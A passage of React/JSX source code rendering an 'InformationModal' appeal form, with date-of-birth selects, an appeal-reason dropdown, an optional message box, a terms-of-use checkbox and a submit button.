              <p className={`${textOverline} mb-1`}>{copy.dob}</p>
              <div className="grid grid-cols-1 gap-3 sm:grid-cols-3 sm:gap-3">
                <div className="min-w-0">
                  <label className={formLabel} htmlFor="dob-month">
                    {copy.month}
                  </label>
                  <div className={wrap(!!errors.dob)}>
                    <select
                      id="dob-month"
                      className={fieldSelect}
                      value={formData.month || ''}
                      onChange={(e) => handleSelectChange('month', e.target.value)}
                    >
                      <option value="" disabled>
                        {copy.selectMonth}
                      </option>
                      {months.map((opt) => (
                        <option key={opt.value} value={opt.value}>
                          {opt.label}
                        </option>
                      ))}
                    </select>
                  </div>
                </div>
                <div className="min-w-0">
                  <label className={formLabel} htmlFor="dob-year">
                    {copy.year}
                  </label>
                  <div className={wrap(!!errors.dob)}>
                    <select
                      id="dob-year"
                      className={fieldSelect}
                      value={formData.year || ''}
                      onChange={(e) => handleSelectChange('year', e.target.value)}
                    >
                      <option value="" disabled>
                        {copy.selectYear}
                      </option>
                      {years.map((y) => (
                        <option key={y} value={y}>
                          {y}
                        </option>
                      ))}
                    </select>
                  </div>
                </div>
                <div className="min-w-0">
                  <label className={formLabel} htmlFor="dob-day">
                    {copy.day}
                  </label>
                  <div className={wrap(!!errors.dob)}>
                    <select
                      id="dob-day"
                      className={fieldSelect}
                      value={formData.day || ''}
                      onChange={(e) => handleSelectChange('day', e.target.value)}
                      disabled={!monthNum || !yearNum}
                    >
                      <option value="" disabled>
                        {!monthNum
                          ? copy.selectMonthFirst
                          : !yearNum
                            ? copy.selectYearFirst
                            : copy.selectDay}
                      </option>
                      {days.map((day) => (
                        <option key={day} value={day}>
                          {day}
                        </option>
                      ))}
                    </select>
                  </div>
                </div>
              </div>
              {errors.dob ? <p className={errorTextClass}>{errors.dob}</p> : null}
            </div>

            <div>
              <label className={formLabel} htmlFor="appealReason">
                {copy.appealReason}
              </label>
              <div className={wrap(false)}>
                <select
                  id="appealReason"
                  className={fieldSelect}
                  value={formData.appealReason || ''}
                  onChange={(e) => handleSelectChange('appealReason', e.target.value)}
                >
                  <option value="">{copy.selectAppealReason}</option>
                  {copy.appealReasonOptions.map((reason) => (
                    <option key={reason.value} value={reason.value}>
                      {reason.label}
                    </option>
                  ))}
                </select>
              </div>
            </div>

            <div>
              <label className={formLabel} htmlFor="message">
                {copy.additionalContext}{' '}
                <span className="font-normal text-slate-500">{copy.optional}</span>
              </label>
              <div className={fieldTextareaShell(false)}>
                <textarea
                  id="message"
                  className={fieldTextarea}
                  placeholder={copy.additionalContextPlaceholder}
                  value={formData.message}
                  onChange={handleChange}
                  rows={4}
                />
              </div>
            </div>
          </div>

          <p className={`mb-5 mt-2 ${textMuted}`}>
            {copy.responseTime}{' '}
            <span className="font-medium text-slate-700">{copy.responseTimeStrong}</span>.
          </p>

          <div className={`mb-6 flex items-start gap-3 ${textLead}`}>
            <span className="mt-0.5 shrink-0">
              <CustomCheckbox />
            </span>
            <label htmlFor="custom-checkbox" className="min-w-0 cursor-pointer pt-0.5">
              {copy.agreePrefix}{' '}
              <a
                href={legalLinks.termsOfService}
                className="font-medium text-blue-600 hover:underline"
                {...externalLinkProps}
                onClick={(e) => e.stopPropagation()}
              >
                {copy.termsOfUse}
              </a>
            </label>
          </div>

          <button type="submit" className={btnPrimary}>
            {copy.submit}
          </button>
        </form>
      </div>
    </Modal>
  );
};

export default InformationModal;
